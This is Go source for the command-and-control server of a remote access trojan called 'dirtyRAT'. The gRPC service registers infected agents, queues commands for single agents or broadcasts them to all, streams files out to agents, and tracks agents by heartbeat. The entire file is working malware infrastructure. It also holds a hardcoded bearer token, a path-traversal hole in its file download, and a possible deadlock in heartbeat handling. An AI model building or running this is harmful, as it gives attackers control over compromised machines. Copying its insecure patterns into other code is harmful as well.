package server

import (
	"context"
	"dirtyRAT/pkg/c2"
	"dirtyRAT/pkg/command"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"
	"time"

	"github.com/grpc-ecosystem/go-grpc-middleware/ratelimit"
	"github.com/grpc-ecosystem/go-grpc-middleware/v2/interceptors/auth"
	"github.com/grpc-ecosystem/go-grpc-middleware/v2/interceptors/logging"
	"github.com/grpc-ecosystem/go-grpc-middleware/v2/interceptors/recovery"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/status"
)

const chunkSize = 64 * 1024 // 64 KB, adjust as needed

type AgentInfo struct {
	Agent    *c2.Agent
	Chan     chan bool
	Commands []*command.Command
}

type Server struct {
	c2.UnimplementedCommandAndControlServer
	mu           sync.Mutex
	Agents       map[string]*AgentInfo
	agentTimeout time.Duration
}

type rateLimiter struct {
	// your internal rate limiter
}

func (rl *rateLimiter) Limit() bool {
	// Return true if the request should be limited (i.e., denied), false otherwise.
	// Use your internal rate limiter logic here.
	return true
}

func StartServer(address string) error {
	lis, err := net.Listen("tcp", address) //:50051
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
		return err
	}
	server := &Server{
		Agents:       make(map[string]*AgentInfo),
		agentTimeout: 2 * time.Minute,
	}

	logger := log.New(os.Stderr, "", log.Ldate|log.Ltime|log.Lshortfile)

	opts := []logging.Option{
		logging.WithLogOnEvents(logging.StartCall, logging.FinishCall),
		// Add any other option if needed.
	}

	// recovery options
	recoveryOpt := recovery.WithRecoveryHandler(func(p interface{}) (err error) {
		// Custom logic, for example, return a custom error message to the client
		return status.Errorf(codes.Internal, "An internal error occurred.")
	})

	s := grpc.NewServer(
		grpc.ChainUnaryInterceptor(
			// auth.UnaryServerInterceptor(authFunc),
			// ratelimit.UnaryServerInterceptor(limiter),
			recovery.UnaryServerInterceptor(recoveryOpt),
			logging.UnaryServerInterceptor(InterceptorLogger(logger), opts...),
		),
		grpc.ChainStreamInterceptor(
			// auth.StreamServerInterceptor(authFunc),
			// ratelimit.StreamServerInterceptor(limiter),
			recovery.StreamServerInterceptor(recoveryOpt),
			logging.StreamServerInterceptor(InterceptorLogger(logger), opts...),
		),
	)
	//s := grpc.NewServer()
	c2.RegisterCommandAndControlServer(s, server)
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
		return err
	}
	return nil
}

func StartServerWithTLS(address string) error {
	// Load server cert and key
	creds, err := credentials.NewServerTLSFromFile("cert.pem", "key.pem")
	if err != nil {
		log.Fatalf("Failed to setup TLS: %v", err)
		return err
	}
	log.Println("TLS setup successful.")
	lis, err := net.Listen("tcp", address) //:50051
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
		return err
	}
	server := &Server{
		Agents:       make(map[string]*AgentInfo),
		agentTimeout: 2 * time.Minute,
	}

	logger := log.New(os.Stderr, "", log.Ldate|log.Ltime|log.Lshortfile)

	opts := []logging.Option{
		logging.WithLogOnEvents(logging.StartCall, logging.FinishCall),
		// Add any other option if needed.
	}

	limiter := &rateLimiter{
		// initialize internal rate limiter here
	}

	// recovery options
	recoveryOpt := recovery.WithRecoveryHandler(func(p interface{}) (err error) {
		// Custom logic, for example, return a custom error message to the client
		return status.Errorf(codes.Internal, "An internal error occurred.")
	})

	s := grpc.NewServer(
		grpc.Creds(creds),
		grpc.ChainUnaryInterceptor(
			auth.UnaryServerInterceptor(authFunc),
			ratelimit.UnaryServerInterceptor(limiter),
			recovery.UnaryServerInterceptor(recoveryOpt),
			logging.UnaryServerInterceptor(InterceptorLogger(logger), opts...),
		),
		grpc.ChainStreamInterceptor(
			auth.StreamServerInterceptor(authFunc),
			ratelimit.StreamServerInterceptor(limiter),
			recovery.StreamServerInterceptor(recoveryOpt),
			logging.StreamServerInterceptor(InterceptorLogger(logger), opts...),
		),
	)

	//s := grpc.NewServer(grpc.Creds(creds)) // Use the TLS credentials
	c2.RegisterCommandAndControlServer(s, server)
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
		return err
	}
	return nil
}

// InterceptorLogger adapts standard Go logger to interceptor logger.
func InterceptorLogger(l *log.Logger) logging.Logger {
	return logging.LoggerFunc(func(_ context.Context, lvl logging.Level, msg string, fields ...any) {
		switch lvl {
		case logging.LevelDebug:
			msg = fmt.Sprintf("DEBUG :%v", msg)
		case logging.LevelInfo:
			msg = fmt.Sprintf("INFO :%v", msg)
		case logging.LevelWarn:
			msg = fmt.Sprintf("WARN :%v", msg)
		case logging.LevelError:
			msg = fmt.Sprintf("ERROR :%v", msg)
		default:
			panic(fmt.Sprintf("unknown level %v", lvl))
		}
		l.Println(append([]any{"msg", msg}, fields...))
	})
}

// authentication
func authFunc(ctx context.Context) (context.Context, error) {
	// Extract the token from the request's metadata
	token, err := auth.AuthFromMD(ctx, "bearer")
	if err != nil {
		return nil, status.Errorf(codes.Unauthenticated, "no token found in metadata")
	}

	// Validate the token (or call actual authentication service or logic here)
	if token != "secret-token" {
		return nil, status.Errorf(codes.Unauthenticated, "invalid token")
	}

	// If authenticated, return the context (possibly enriched with user information or other data)
	return ctx, nil
}

func (s *Server) RegisterAgent(ctx context.Context, req *c2.RegistrationRequest) (*c2.RegistrationResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	agentID := fmt.Sprintf("%d", len(s.Agents)+1)

	newAgentInfo := &AgentInfo{
		Agent: &c2.Agent{
			AgentID:   agentID,
			AgentName: req.AgentName,
		},
		Chan:     make(chan bool),
		Commands: make([]*command.Command, 0),
	}

	s.Agents[agentID] = newAgentInfo

	go s.monitorAgentHeartbeat(agentID)

	log.Printf("Registered agent with ID: %s, Name: %s", agentID, req.AgentName)
	return &c2.RegistrationResponse{AgentID: agentID, Status: "Registered Successfully"}, nil
}

func (s *Server) ListAgents(ctx context.Context, _ *c2.Empty) (*c2.AgentListResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	var agents []*c2.Agent
	for _, agent := range s.Agents {
		agents = append(agents, agent.Agent)
	}

	return &c2.AgentListResponse{Agents: agents}, nil
}

func (s *Server) SendCommandToServer(ctx context.Context, req *c2.CommandRequest) (*c2.CommandResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	command := *command.NewCommand(req)
	if req.Broadcast {
		log.Printf("Broadcast command: %s", command.Cmd)
		for _, agentInfo := range s.Agents {
			agentInfo.Commands = append(agentInfo.Commands, &command)
		}
	} else {
		if agentInfo, exists := s.Agents[req.AgentID]; exists {
			agentInfo.Commands = append(agentInfo.Commands, &command)
			log.Printf("Sent command: %s to agent ID: %s", command.Cmd, req.AgentID)
		}
	}

	return &c2.CommandResponse{Status: "Received"}, nil
}

func (s *Server) FetchCommandFromServer(ctx context.Context, req *c2.AgentFetchRequest) (*c2.CommandResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	agentInfo, exists := s.Agents[req.AgentID]
	if !exists || len(agentInfo.Commands) == 0 {
		return &c2.CommandResponse{Status: "No commands"}, nil
	}

	nextCommand := agentInfo.Commands[0]
	agentInfo.Commands = agentInfo.Commands[1:]

	log.Printf("Agent ID: %s fetched command: %s", req.AgentID, nextCommand.Cmd)

	return &c2.CommandResponse{
		Command:   nextCommand.Cmd,
		Arguments: nextCommand.Arguments,
		Status:    "Success",
	}, nil
}

func (s *Server) DownloadFile(req *c2.FileRequest, stream c2.CommandAndControl_DownloadFileServer) error {
	log.Printf("Initiated file download for: %s", req.Filename)
	filePath := "files/" + req.Filename
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	buf := make([]byte, chunkSize)
	for {
		n, err := file.Read(buf)
		if err != nil {
			if err == io.EOF {
				break
			}
			return err
		}
		if err := stream.Send(&c2.FileChunk{Data: buf[:n]}); err != nil {
			return err
		}
	}

	return nil
}

func (s *Server) Heartbeat(ctx context.Context, req *c2.HeartbeatRequest) (*c2.HeartbeatResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	agentInfo, exists := s.Agents[req.AgentID]
	if exists {
		agentInfo.Chan <- true
		log.Printf("Received heartbeat from agent ID: %s", req.AgentID)
		return &c2.HeartbeatResponse{Status: "OK"}, nil
	}
	return &c2.HeartbeatResponse{Status: "Offline"}, nil
}

func (s *Server) monitorAgentHeartbeat(agentID string) {
	agentInfo, exists := s.Agents[agentID]
	if !exists {
		return
	}

	for {
		select {
		case <-time.After(s.agentTimeout):
			s.mu.Lock()
			delete(s.Agents, agentID)
			s.mu.Unlock()
			log.Printf("Agent %s has dropped off", agentID)
			return
		case <-agentInfo.Chan:
			// Reset the timer when we receive a heartbeat
			continue
		}
	}
}
